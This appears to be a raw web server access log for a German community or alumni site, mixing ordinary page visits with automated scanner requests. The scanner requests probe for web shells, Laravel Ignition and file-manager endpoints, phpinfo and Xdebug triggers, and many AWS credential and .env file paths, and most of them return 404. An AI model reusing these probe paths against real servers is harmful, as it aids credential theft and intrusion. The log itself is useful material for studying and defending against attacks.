user;timestamp;referer;target;method;status
db0dd959297bcbbbda09e0b8ca04a26d1c2c77ef590c34d0c2b70f7df5d3f656;2025-11-15 18:05:14;;/great.php;GET;404
db0dd959297bcbbbda09e0b8ca04a26d1c2c77ef590c34d0c2b70f7df5d3f656;2025-11-15 18:05:14;;/fifii.php;GET;404
db0dd959297bcbbbda09e0b8ca04a26d1c2c77ef590c34d0c2b70f7df5d3f656;2025-11-15 18:05:14;;/12.php;GET;404
db0dd959297bcbbbda09e0b8ca04a26d1c2c77ef590c34d0c2b70f7df5d3f656;2025-11-15 18:05:14;;/efile.php;GET;404
db0dd959297bcbbbda09e0b8ca04a26d1c2c77ef590c34d0c2b70f7df5d3f656;2025-11-15 18:05:15;;/past1.php;GET;404
db0dd959297bcbbbda09e0b8ca04a26d1c2c77ef590c34d0c2b70f7df5d3f656;2025-11-15 18:05:15;;/7.php;GET;404
db0dd959297bcbbbda09e0b8ca04a26d1c2c77ef590c34d0c2b70f7df5d3f656;2025-11-15 18:05:15;;/4563.php;GET;404
db0dd959297bcbbbda09e0b8ca04a26d1c2c77ef590c34d0c2b70f7df5d3f656;2025-11-15 18:05:15;;/re.php;GET;404
db0dd959297bcbbbda09e0b8ca04a26d1c2c77ef590c34d0c2b70f7df5d3f656;2025-11-15 18:05:15;;/up.php;GET;404
db0dd959297bcbbbda09e0b8ca04a26d1c2c77ef590c34d0c2b70f7df5d3f656;2025-11-15 18:05:15;;/35.php;GET;404
db0dd959297bcbbbda09e0b8ca04a26d1c2c77ef590c34d0c2b70f7df5d3f656;2025-11-15 18:05:15;;/witm.php;GET;404
db0dd959297bcbbbda09e0b8ca04a26d1c2c77ef590c34d0c2b70f7df5d3f656;2025-11-15 18:05:15;;/atomlib.php;GET;404
db0dd959297bcbbbda09e0b8ca04a26d1c2c77ef590c34d0c2b70f7df5d3f656;2025-11-15 18:05:15;;/bless2.php;GET;404
db0dd959297bcbbbda09e0b8ca04a26d1c2c77ef590c34d0c2b70f7df5d3f656;2025-11-15 18:05:16;;/new4.php;GET;404
db0dd959297bcbbbda09e0b8ca04a26d1c2c77ef590c34d0c2b70f7df5d3f656;2025-11-15 18:05:16;;/wsr2.php;GET;404
db0dd959297bcbbbda09e0b8ca04a26d1c2c77ef590c34d0c2b70f7df5d3f656;2025-11-15 18:05:16;;/shlo.php;GET;404
db0dd959297bcbbbda09e0b8ca04a26d1c2c77ef590c34d0c2b70f7df5d3f656;2025-11-15 18:05:16;;/CLA.php;GET;404
db0dd959297bcbbbda09e0b8ca04a26d1c2c77ef590c34d0c2b70f7df5d3f656;2025-11-15 18:05:16;;/kill-9-1.php;GET;404
f16a7b400f03ce57dc324a89d91e2068d5ea66fea37a4a111185f771b69ad4d5;2025-11-15 18:06:41;;/personen;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-15 18:13:00;;/register;GET;200
0cee5ef63d255a08bcd7da8ddaed14eed0593c8e657dca230c9c14a15cbb8037;2025-11-15 18:13:01;;/;HEAD;200
0cee5ef63d255a08bcd7da8ddaed14eed0593c8e657dca230c9c14a15cbb8037;2025-11-15 18:13:01;;/;GET;200
0cee5ef63d255a08bcd7da8ddaed14eed0593c8e657dca230c9c14a15cbb8037;2025-11-15 18:13:01;;/;GET;200
0cee5ef63d255a08bcd7da8ddaed14eed0593c8e657dca230c9c14a15cbb8037;2025-11-15 18:13:02;;/vendor/laravel-filemanager/js/script.js;GET;404
0cee5ef63d255a08bcd7da8ddaed14eed0593c8e657dca230c9c14a15cbb8037;2025-11-15 18:13:02;;/public/vendor/laravel-filemanager/js/script.js;GET;404
0cee5ef63d255a08bcd7da8ddaed14eed0593c8e657dca230c9c14a15cbb8037;2025-11-15 18:13:03;;/_ignition/execute-solution;GET;404
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-15 18:14:26;;/personen/alumni/schule/0351;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-15 18:15:41;;/login;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-15 18:17:06;;/;GET;200
6eb58177c1d8b4677e5af38137920d8617a2da7fd20355662a0ecbdbedaca73e;2025-11-15 18:17:07;;/;GET;200
6eb58177c1d8b4677e5af38137920d8617a2da7fd20355662a0ecbdbedaca73e;2025-11-15 18:17:08;/;/;GET;200
d9bec6cab084b4235de8f09e4410dc7115977a3d4e0984541856f745ea76591e;2025-11-15 18:20:20;;/;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-15 18:22:19;/?XDEBUG_SESSION_START=phpstorm;/?XDEBUG_SESSION_START=phpstorm;GET;200
0e576698e9f368cebff0f17ac1bc3343e9f162ee1461b3008a29d3d4f850531a;2025-11-15 18:30:12;;/;GET;200
d9bec6cab084b4235de8f09e4410dc7115977a3d4e0984541856f745ea76591e;2025-11-15 18:39:21;;/;GET;200
4ab332072e83bfa3f959a6b690174f64f7d0f96bda5a8052f17d35f824a0fc83;2025-11-15 18:43:55;;/;GET;200
2909923c17713f7bb253712fb3cdb66bc26eea24c6f284fe53684c62c0cb8f67;2025-11-15 18:51:37;;/app_dev.php/_profiler/phpinfo;GET;404
2909923c17713f7bb253712fb3cdb66bc26eea24c6f284fe53684c62c0cb8f67;2025-11-15 18:51:43;;/?phpinfo=-1;GET;200
2909923c17713f7bb253712fb3cdb66bc26eea24c6f284fe53684c62c0cb8f67;2025-11-15 18:51:50;;/aws.yml;GET;404
2909923c17713f7bb253712fb3cdb66bc26eea24c6f284fe53684c62c0cb8f67;2025-11-15 18:51:54;;/env.txt;GET;404
2909923c17713f7bb253712fb3cdb66bc26eea24c6f284fe53684c62c0cb8f67;2025-11-15 18:51:56;;/test.php;GET;404
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-15 19:04:22;/personen/alumni/schule/4240404;/personen/alumni/schule/10A04;GET;200
d2234e42d5f52c8b7356e6d345e16531c8c01bd9ecd2596022f5938b932a43a7;2025-11-15 19:05:31;;/aktuelles/meldungen?category=community;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-15 19:05:35;/gruppen/hobby/politik-und-debatten;/gruppen/interesse/datenanalyse-und-forschung;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-15 19:07:04;/gruppen/plausch/ai-driven-programme;/gruppen/hobby/gartnern;GET;302
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-15 19:07:09;/gruppen/plausch/ai-driven-programme;/gruppen;GET;200
d5328b9c9aaa45e4e9ffd80837b8908b30ed795e5c24f0db4c5c1bb4b13aff6e;2025-11-15 19:10:46;;/media/cache/avatar_sm/images/user/a18c50d9a68390dd0addaaba28a42c6c.jpg;GET;404
3575ccd799486ad0117c61ad31c1aab315cd05b6d3e5c5683c542f10e3819f41;2025-11-15 19:13:58;;/;GET;200
b6f8773ae542bd6f17b23b0b37175f6c110bcc9091ad25b805ea968b6039da5e;2025-11-15 19:22:42;;/;GET;200
54078db109379ba66516f7db0863399673fcd06f6628d0c55d6f9547b693ab20;2025-11-15 19:30:07;;/;GET;200
a7f9ca8d0febfcbe6eb4761d5247751fbe04e30332d17bea27281f61580b6c52;2025-11-15 19:35:22;;/personen/alumni/schule/SL001;GET;200
fd4f83800bc910a053eebcf4966c47261b22ec225a3eb7e4d227b3c8d1690898;2025-11-15 19:53:01;;/gruppen/hobby/einzelsportarten;GET;302
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-15 19:56:56;/actuator/gateway/routes;/actuator/gateway/routes;GET;404
bf7672925036fd026f0c8e8cc7e1ae72a4b77892fd03ad72407a47273e65167d;2025-11-15 20:01:29;;/login;GET;200
0cee5ef63d255a08bcd7da8ddaed14eed0593c8e657dca230c9c14a15cbb8037;2025-11-15 20:13:49;;/;HEAD;200
0cee5ef63d255a08bcd7da8ddaed14eed0593c8e657dca230c9c14a15cbb8037;2025-11-15 20:13:49;;/;GET;200
0cee5ef63d255a08bcd7da8ddaed14eed0593c8e657dca230c9c14a15cbb8037;2025-11-15 20:13:50;;/;GET;200
0cee5ef63d255a08bcd7da8ddaed14eed0593c8e657dca230c9c14a15cbb8037;2025-11-15 20:13:51;;/vendor/laravel-filemanager/js/script.js;GET;404
0cee5ef63d255a08bcd7da8ddaed14eed0593c8e657dca230c9c14a15cbb8037;2025-11-15 20:13:51;;/public/vendor/laravel-filemanager/js/script.js;GET;404
0cee5ef63d255a08bcd7da8ddaed14eed0593c8e657dca230c9c14a15cbb8037;2025-11-15 20:13:51;;/_ignition/execute-solution;GET;404
0cee5ef63d255a08bcd7da8ddaed14eed0593c8e657dca230c9c14a15cbb8037;2025-11-15 20:19:41;;/;HEAD;200
0cee5ef63d255a08bcd7da8ddaed14eed0593c8e657dca230c9c14a15cbb8037;2025-11-15 20:19:41;;/;GET;200
0cee5ef63d255a08bcd7da8ddaed14eed0593c8e657dca230c9c14a15cbb8037;2025-11-15 20:19:43;;/;GET;200
0cee5ef63d255a08bcd7da8ddaed14eed0593c8e657dca230c9c14a15cbb8037;2025-11-15 20:19:44;;/vendor/laravel-filemanager/js/script.js;GET;404
0cee5ef63d255a08bcd7da8ddaed14eed0593c8e657dca230c9c14a15cbb8037;2025-11-15 20:19:44;;/public/vendor/laravel-filemanager/js/script.js;GET;404
0cee5ef63d255a08bcd7da8ddaed14eed0593c8e657dca230c9c14a15cbb8037;2025-11-15 20:19:44;;/_ignition/execute-solution;GET;404
d40868d381c2bc360782cec6cc70235ac7b3134628faa31ac007a4a6bd2ddbd9;2025-11-15 20:20:02;;/;HEAD;200
d40868d381c2bc360782cec6cc70235ac7b3134628faa31ac007a4a6bd2ddbd9;2025-11-15 20:20:02;;/;GET;200
d40868d381c2bc360782cec6cc70235ac7b3134628faa31ac007a4a6bd2ddbd9;2025-11-15 20:20:03;;/;GET;200
d40868d381c2bc360782cec6cc70235ac7b3134628faa31ac007a4a6bd2ddbd9;2025-11-15 20:20:03;;/vendor/laravel-filemanager/js/script.js;GET;404
d40868d381c2bc360782cec6cc70235ac7b3134628faa31ac007a4a6bd2ddbd9;2025-11-15 20:20:04;;/public/vendor/laravel-filemanager/js/script.js;GET;404
d40868d381c2bc360782cec6cc70235ac7b3134628faa31ac007a4a6bd2ddbd9;2025-11-15 20:20:04;;/_ignition/execute-solution;GET;404
d40868d381c2bc360782cec6cc70235ac7b3134628faa31ac007a4a6bd2ddbd9;2025-11-15 20:20:04;;/public/_ignition/execute-solution;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-15 20:22:47;;/configura/aws_settings.php;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-15 20:22:48;;/backup/aws-credentials.bak;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-15 20:22:49;;/config/aws-credentials.php;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-15 20:22:50;;/wp-content/uploads/env.php;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-15 20:22:51;;/konfig/aws-credentials.php;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-15 20:22:51;;/config/env/production.json;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-15 20:22:52;;/instance/aws_credentials.py;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-15 20:22:53;;/backup/aws_credentials.json;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-15 20:22:53;;/aws/env/aws_env_config.json;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-15 20:22:54;;/configura/aws_configura.php;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-15 20:22:55;;/configuration/cloud/aws.yml;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-15 20:22:56;;/config/aws/credentials.json;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-15 20:22:56;;/ubuntu/.aws/credentials.ini;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-15 20:22:57;;/wp-includes/aws_config.json;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-15 20:22:58;;/app/config/services/aws.php;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-15 20:22:59;;/app/configura/cloud/aws.php;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-15 20:23:00;;/app/konfig/services/aws.php;GET;404
e323e90de75fb0c8379cadf511b027b13d93d7733d0134bcf0004bed76256517;2025-11-15 20:23:00;;/sites/default/files/env.php;GET;404
